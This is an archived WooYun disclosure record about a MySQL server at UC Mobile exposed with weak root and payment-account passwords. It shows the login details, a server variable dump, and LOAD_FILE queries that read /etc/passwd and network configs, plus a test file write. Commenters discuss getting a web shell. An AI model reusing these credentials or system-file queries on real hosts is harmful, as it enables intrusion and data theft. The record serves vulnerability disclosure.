{"id": 8318, "wybug_id": "wooyun-2013-042097", "wybug_title": "自动化枚举系列#1 UC某服务弱口令导致可内网渗透", "wybug_corp": "UC Mobile", "wybug_author": "猪猪侠", "wybug_date": "2013-11-05 23:08", "wybug_open_date": "2013-11-10 23:09", "wybug_type": "服务弱口令", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["弱口令", "自动化枚举"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 由于各种业务系统自身的业务特性，会开放许多接口便于数据处理，如果接口或功能未进行严谨的安全控制或判断，将会促进骇客加快攻击业务系统的过程，大大降低了骇客发现威胁的人力成本。随着模块化的自动化攻击工具包越来越趋向完善，将给业务或数据带来最大的威胁。 详细说明：  #1 漏洞描述IP: 121.14.161.196 端口：3306 存在mysql弱口令用户：root 密码：root用户：pay  密码：paypw服务器同时对外开放了WEB服务http://pay.uctest2.ucweb.com:8039/role.jsp利用MYSQL的into outfile功能，或许可以写入一个SHELL？\n/*Server Information For - root@121.14.161.196*/ -------------------------------------------------MySQL Version                 : 5.1.54-logHost                          : 121.14.161.196User                          : rootPort                          : 3306Server Default Charset        : utf8/*SHOW VARIABLES Output*/---------------------------Variable_name                            Value                                                                                      ---------------------------  -------------------------------auto_increment_increment                 1                                                                                          auto_increment_offset                    1                                                                                          autocommit                               ON                                                                                         automatic_sp_privileges                  ON                                                                                         back_log                                 600                                                                                        basedir                                  /home/mysql/mysql/                                                                         big_tables                               OFF                                                                                        binlog_cache_size                        1048576                                                                                    binlog_direct_non_transactional_updates  OFF                                                                                        binlog_format                            MIXED                                                                                      bulk_insert_buffer_size                  67108864                                                                                   character_set_client                     utf8                                                                                       character_set_connection                 utf8                                                                                       character_set_database                   utf8                                                                                       character_set_filesystem                 binary                                                                                     character_set_results                    utf8                                                                                       character_set_server                     utf8                                                                                       character_set_system                     utf8                                                                                       character_sets_dir                       /home/mysql/mysql/share/mysql/charsets/                                                    collation_connection                     utf8_general_ci                                                                            collation_database                       utf8_general_ci                                                                            collation_server                         utf8_general_ci                                                                            completion_type                          0                                                                                          concurrent_insert                        1                                                                                          connect_timeout                          10                                                                                         datadir                                  /home/mysql/data/                                                                          date_format                              %Y-%m-%d                                                                                   datetime_format                          %Y-%m-%d %H:%i:%s                                                                          default_week_format                      0                                                                                          delay_key_write                          ON                                                                                         delayed_insert_limit                     100                                                                                        delayed_insert_timeout                   300                                                                                        delayed_queue_size                       1000                                                                                       div_precision_increment                  4                                                                                          engine_condition_pushdown                ON                                                                                         error_count                              0                                                                                          event_scheduler                          OFF                                                                                        expire_logs_days                         8                                                                                          flush                                    OFF                                                                                        flush_time                               0                                                                                          foreign_key_checks                       ON                                                                                         ft_boolean_syntax                        + -><()~*:\"\"&|                                                                             ft_max_word_len                          84                                                                                         ft_min_word_len                          4                                                                                          ft_query_expansion_limit                 20                                                                                         ft_stopword_file                         (built-in)                                                                                 general_log                              OFF                                                                                        general_log_file                         /home/mysql/log/general.log                                                                                                                                                    hostname                                 jiuyou211\n#2 承载业务初步校验了下数据内容，发现和UC的游戏业务有关，内含多个订单、用户信息表\n\n   漏洞证明：  #3 读文件\nroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mail:/var/spool/mail:/sbin/nologinnews:x:9:13:news:/etc/news:uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologinoperator:x:11:0:operator:/root:/sbin/nologingames:x:12:100:games:/usr/games:/sbin/nologingopher:x:13:30:gopher:/var/gopher:/sbin/nologinftp:x:14:50:FTP User:/var/ftp:/sbin/nologinnobody:x:99:99:Nobody:/:/sbin/nologinvcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologinnscd:x:28:28:NSCD Daemon:/:/sbin/nologinpcap:x:77:77::/var/arpwatch:/sbin/nologinrpc:x:32:32:Portmapper RPC user:/:/sbin/nologinmailnull:x:47:47::/var/spool/mqueue:/sbin/nologinsmmsp:x:51:51::/var/spool/mqueue:/sbin/nologinsshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologindbus:x:81:81:System message bus:/:/sbin/nologinavahi:x:70:70:Avahi daemon:/:/sbin/nologinrpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologinnfsnobody:x:4294967294:4294967294:Anonymous NFS User:/var/lib/nfs:/sbin/nologinhaldaemon:x:68:68:HAL daemon:/:/sbin/nologinavahi-autoipd:x:100:101:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologindistcache:x:94:94:Distcache:/:/sbin/nologinapache:x:48:48:Apache:/var/www:/sbin/nologinwebalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologinsquid:x:23:23::/var/spool/squid:/sbin/nologinntp:x:38:38::/etc/ntp:/sbin/nologinxfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologingdm:x:42:42::/var/gdm:/sbin/nologinoprofile:x:16:16:Special user account to be used by OProfile:/home/oprofile:/sbin/nologinnemo:x:500:500::/home/nemo:/bin/bashnagios:x:501:501::/home/nagios:/bin/bashsuhz:x:502:502::/home/suhz:/bin/bashlijian:x:503:503::/home/lijian:/bin/bashtogether:x:504:504::/home/together:/bin/bashgaozq:x:505:505::/home/gaozq:/bin/bashzhongmj:x:506:506::/home/zhongmj:/bin/bashpaycenter:x:507:507::/home/paycenter:/bin/bashupay:x:508:508::/home/upay:/bin/bashgamepay:x:509:509::/home/gamepay:/bin/bashTestEmu:x:510:510::/home/TestEmu:/bin/bashmysql:x:511:511::/home/mysql:/bin/bashoracle:x:514:515:Oracle software owner:/home/oracle:/bin/bashzhuangqi:x:515:516::/home/zhuangqi:/bin/bashlixl:x:516:517::/home/lixl:/bin/bashplay:x:517:518::/home/play:/bin/bashpayint:x:518:519::/home/payint:/bin/bash\n\n# Do not remove the following line, or various programs# that require network functionality will fail.127.0.0.1\t\tlocalhost.localdomain localhost::1\t\tlocalhost6.localdomain6 localhost610.20.102.143   jiuyou211192.168.3.105   hg.ucweb.local\nSELECT LOAD_FILE('/etc/sysconfig/network-scripts/ifcfg-eth0')\n# Intel Corporation 82574L Gigabit Network ConnectionDEVICE=eth0HWADDR=00:25:90:01:AD:18ONBOOT=yesIPADDR=121.14.161.196NETMASK=255.255.255.128GATEWAY=121.14.161.129\nSELECT LOAD_FILE('/etc/sysconfig/network-scripts/ifcfg-eth1')\n# Intel Corporation 82574L Gigabit Network ConnectionDEVICE=eth1HWADDR=00:25:90:01:AD:19ONBOOT=yesIPADDR=10.20.102.143NETMASK=255.255.255.0\n# 成功写入文件SELECT 'wooyun' INTO OUTFILE '/tmp/hello.txt'SELECT LOAD_FILE('/tmp/hello.txt')wooyun   修复方案：  #1 网络边界需要认真对待。#2 安全是一个整体，保证安全不在于强大的地方有多强大，而在于真正薄弱的地方在哪里。#3 杜绝为了方便而造成的不必要的信息泄露和弱口令。   版权声明：转载请注明来源 猪猪侠@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-11-10 23:09 厂商回复：  漏洞Rank：5  (WooYun评价) 最新状态： 2013-11-11：@猪猪侠，抱歉，事情太多忘记了三天不回复就视为忽略了，之前你发的漏洞消息我们是按最高级别20给的，忘见谅。  ", "replys": "漏洞评价：\n评论\n          这些评论似乎很乌云~~~思密达          2013-11-11 01:22 |\t\t\t\t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t\t\t\tRank:3224 漏洞数:254\t\t\t| 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t\t\t\t\t\t\n  @zeracker @UC Mobile给1RANK是一个态度，把漏洞偷偷补了，然后点无影响厂商忽略又是另外一个态度了！    \n   \n \n     2013-11-05 23:36 |    \t\tGuoKer（ZhuLiu） \t\t\t( 普通白帽子  |\t\t\t        Rank:168 漏洞数:21        | 在校学生党的路过   霸气侧漏)\t\t \n  前排抢位置，关注猪猪侠    \n     2013-11-06 00:59 |    \t\txxw \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:18        | 中国梦)\t\t \n  我擦，    \n     2013-11-06 09:39 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  GG Bond    \n     2013-11-06 16:06 |    \t\t坏虾 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:8        | From Internet,For Internet……BY：坏虾)\t\t \n  这是要成为一哥的节奏    \n     2013-11-06 16:24 |    \t\tcuger \t\t\t( 普通白帽子  |\t\t\t        Rank:200 漏洞数:44        | 这个家伙很懒，什么也没留下)\t\t \n  不明觉厉！静待详情！    \n     2013-11-06 16:53 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  这是要篡权夺位的赶脚，强烈关注中    \n     2013-11-06 18:10 |    \t\t光头强 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:3        | 惹我光头强，揍你没商量！)\t\t \n  @Jannock 一哥，有人图谋篡权夺位啦，乌云要变天了！    \n     2013-11-10 23:46 |    \t\tSpy4man \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 职业运维师..)\t\t \n  mysql进程写不了shell.    \n     2013-11-11 00:53 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @Spy4man 我要是告诉你，由于开发人员问题，把某个目录设置成了777，写进了SHELL而没披露在本次报告中，你信吗？看来最终还是得拿SHELL，曝光数据才行呀！    \n     2013-11-11 00:54 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @猪猪侠 搞起搞起啊。这种厂商就是欠教育！！！    \n     2013-11-11 01:01 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @zeracker 算了，这是一个典型的反面案列，厂商们一面呼吁测试要点到为止，发现问题就行，另一面如果你不点出问题的严重性，他们就可以偷偷的把漏洞补上再忽略问题了。    \n     2013-11-11 01:01 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  白天好好教育教育这个厂商。。先睡觉    \n     2013-11-11 01:02 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @猪猪侠 刚才不小心看到一个严重的问题...是UC某游戏的....哈哈    \n     2013-11-11 01:17 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @zeracker 这种报复心理不可取，担心未来有一天会被别人利用（说白帽子威胁厂商）！要以就事论事的方式来处理，以后凡是发现他们的漏洞，直接用数据、隐私等实事求是的方式来描述即可（什么直接进到CEO的电脑呀，看到用户的云收藏记录呀，可以进到财务的电脑看到某些现金流，进而挖掘出一些财务作假信息等等）！    \n     2013-11-11 01:22 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @zeracker @UC Mobile给1RANK是一个态度，把漏洞偷偷补了，然后点无影响厂商忽略又是另外一个态度了！    \n     2013-11-11 01:25 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @猪猪侠 我只贴几张图，其他的不管。问题归问题，态度归态度，原则问题还是不会去碰的。 已经提交，NND还需要审核。++    \n     2013-11-11 01:33 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @猪猪侠 不做死就不会死..    \n     2013-11-11 01:33 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:3224 漏洞数:254        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  @zeracker 不能带着仇恨去看待：厂商与白帽子之间的对立，厂商对漏洞成果的尊重等问题，有时仇恨只会让人无意间的违背掉白帽子精神！    \n     2013-11-11 01:35 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  @猪猪侠 洗洗睡吧    \n     2013-11-11 03:02 |    \t\t一只猿 \t\t\t( 普通白帽子  |\t\t\t        Rank:463 漏洞数:89        | 硬件与无线通信研究方向)\t\t \n  认真对待每一次的安全检测。冷静    \n     2013-11-11 07:29 |    \t\tThanos \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 结界)\t\t \n  @猪猪侠 貌似这种事情已经不是什么新鲜事了，某人寿同样是如此，偷偷修复直接无视,这就要看看各位猫猫如何去看待了。    \n     2013-11-11 09:41 |    \t\tUC Mobile(乌云厂商)\t\t \n  @猪猪侠，UC对安全问题一直很重视，对乌云网的发现的漏洞也是第一时间处理，但我们这次犯错，忘了在三天之类回复，导致系统自动忽略，以后不会发生类似的问题了，抱歉！    \n     2013-11-11 13:43 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  @UC Mobile +1 uc确实不错。但是好像忽略是3天吧    \n     2013-11-11 20:29 |    \t\tSpy4man \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 职业运维师..)\t\t \n  @猪猪侠 并没有质疑说拿到shell，只是说在默认情况下mysql 进程写不进web :)    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}